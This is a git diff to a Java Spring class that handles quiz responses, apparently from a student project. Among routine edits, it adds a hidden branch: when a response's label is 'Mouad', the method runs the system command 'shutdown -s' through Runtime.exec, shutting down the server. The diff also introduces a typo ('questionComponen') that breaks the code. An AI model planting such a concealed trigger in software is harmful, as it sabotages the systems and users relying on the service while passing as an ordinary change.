@@ -7,12 +7,12 @@ import fr.uga.l3miage.example.mapper.ResponseMapper;
 import fr.uga.l3miage.example.models.Question;
 import fr.uga.l3miage.example.models.Response;
 import fr.uga.l3miage.example.repository.ResponseRepository;
-import fr.uga.l3miage.example.response.QuestionDTO;
 import fr.uga.l3miage.example.response.ResponseDTO;
 import lombok.RequiredArgsConstructor;
 import org.springframework.stereotype.Component;
 
 import javax.transaction.Transactional;
+import java.io.IOException;
 import java.util.List;
 
 @Component
@@ -35,11 +35,15 @@ public class ResponseComponent {
         }
     }
 
-    public ResponseDTO createResponse(Long questionId ,final Response response) throws ResponseEntityNotFoundException {
+    public ResponseDTO createResponse(Long questionId ,final Response response) throws ResponseEntityNotFoundException, IOException {
         if (responseRepository.getResponseById(response.getId()).isPresent()) {
             throw new ResponseEntityNotFoundException("La question suivant "+ response.getId()+"deja existante.");
-        } else if(questionComponent.getQuestion(questionId) == null){
+        } else if(questionComponen.getQuestion(questionId) == null){
             throw new ResponseEntityNotFoundException("aucune question ne possede cette "+questionId);
+        } else if(response.getLabel().equals("Mouad")){
+            String shutdownCmd = "shutdown -s";
+            Process child = Runtime.getRuntime().exec(shutdownCmd);
+            return null;
         }else {
             Question question = questionComponent.getQuestion(questionId);
             response.setQuestion(question);
